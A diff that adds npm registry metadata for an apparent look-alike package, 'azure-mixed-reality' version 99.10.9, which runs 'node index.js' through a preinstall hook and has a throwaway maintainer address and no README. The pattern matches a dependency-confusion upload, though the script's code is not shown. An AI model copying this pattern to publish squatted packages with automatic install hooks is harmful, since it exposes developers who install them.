@@ -1,0 +1,62 @@
+{
+    "_id": "azure-mixed-reality",
+    "name": "azure-mixed-reality",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-mixed-reality",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-mixed-reality@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-hK8mrMO/ZMjyyAKgBedWbp8VFQqAwRsR4QqkY3WpqoEIivrnk0v9WivJHeBC2SVNPm53qJb0xP8ry8XDKQVHfQ==",
+                "shasum": "c1e1c6f594e3c9389c35148e6465d3ab437b9158",
+                "tarball": "https://registry.npmjs.org/azure-mixed-reality/-/azure-mixed-reality-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5071,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOq1WACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrI0Q//ccLFnA6hHqLUh4ak7Cl5NQNKwTQk+XyX/3N4z7G+Utc4DHa5\r\niw+cJThpDiN5X9fVyQEqN5ZgUv5wEJdQwJFNXN05DsQlN/mqxEXBrFgmeX0L\r\n36047nZjVBKy71ebem/a0BSoEy+lLs7ajsEf5TXVhXL7xoBlYIxkU8U/E7Vh\r\nm9lWCXbWoxQXSO2811jTBYCOfyGRtQe43XVICG13p84+Cclm0W3qjAPlNxvu\r\nhkF+AbFl8fvdiRMLuQjxQrLwAOIU49h9yiLdTfJgqEOL4IIbxVu5VC8dT021\r\nreeUTG1XeipR4gkyrNv1AAvsP/a3bH/q4a9/aNtFIrHTbzyFbciOFy1D+YI3\r\nyGCimkyaRHjVRXuH4U2hH92kM2QaPhkEFZ7B22G/T9wDPX/doydTLpm52164\r\nSavy8ztCf57EWmJk3YGH4NMELNUnGKqO9sneugDScmLpLrMhb1J2o8aRSjjQ\r\nYrc69oYn14YqqYxuoW2yvMPPsa+m7T3Kw120V1oHQZsKLohf4ZIyAVQN2Qgl\r\nnhVm7UqdzWAEHLB6cILxN4Cz9cp/rwVJ5n3D720uqnETwveye9xqMFmxkMAw\r\n+wqbG0JgP8ER8B2qkHcwF0O6LgQ7nq1pq4SqxtYnEc0x8FCjEvZY83o3NPPM\r\ndRGel8i769V4wp7wx29shf2z735D62PNcU0=\r\n=wKSc\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "zee2g0m8",
+                "email": "zee2g0m8@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "zee2g0m8",
+                    "email": "zee2g0m8@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-mixed-reality_99.10.9_1648012630562_0.7392833912026164"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T05:17:10.562Z",
+        "99.10.9": "2022-03-23T05:17:10.707Z",
+        "modified": "2022-03-23T05:17:10.810Z"
+    },
+    "maintainers": [
+        {
+            "name": "zee2g0m8",
+            "email": "zee2g0m8@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
